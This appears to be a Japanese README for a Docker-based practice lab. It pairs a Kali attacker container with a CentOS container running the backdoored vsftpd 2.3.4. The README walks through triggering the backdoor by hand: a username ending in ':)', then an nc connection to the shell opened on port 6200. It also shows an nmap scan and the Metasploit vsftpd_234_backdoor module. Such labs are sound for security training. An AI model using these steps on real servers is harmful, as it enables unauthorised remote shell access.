## 狙いの脆弱性
`exploit/unix/ftp/vsftpd_234_backdoor`
(http://www.intellilink.co.jp/article/vulner/110706.html)

## 環境構築
```
docker-compose build
docker-compose up -d
```
以上で、attacker(kali-linux)とpot(centos)コンテナが立ち上がります。

また、
`docker-compose exec コンテナ名 bash`
を実行すると各コンテナのbashに入れます

ちょっと自動化できなかった部分があるので、各コンテナで以下のファイルのコマンドを実行してください。
### attacker
`commands/db_init`
### pot
`commands/vsftpd_start`

## pot側で使えるコマンド例
vsftpd(ftpサーバー)が立ち上がります
```
ifconfig # アドレス確認
netstat -tanp # 使用中のポート番号確認
```

### 自分でコマンドから攻撃
```
[root@af9a3aa43de2 vsftpd-2.3.4]# ftp localhost
Name (localhost:root): aaaa:) # 任意の文字列+:)
331 Please specify the password.
Password: # 入力なしで
# 以下別のシェルで
[root@af9a3aa43de2 vsftpd-2.3.4]# netstat -na | grep LISTEN | grep tcp # tcp 6200番が開いたことを確認
nc -nv 172.28.0.2 6200 # pot側のアドレス
# 以下からシェルが使えることを確認
```

## attacker側で使えるコマンド例
msfconsoleが使えます

```
ifconfig # アドレス確認
nmap -sS -A 172.28.0.2 # potで開いてるポートの確認(pot側のアドレス)
```

### 攻撃時
```
root@93bb602c36d3:/# msfconsole
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 172.28.0.2
(↑pot側のアドレス)
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
```
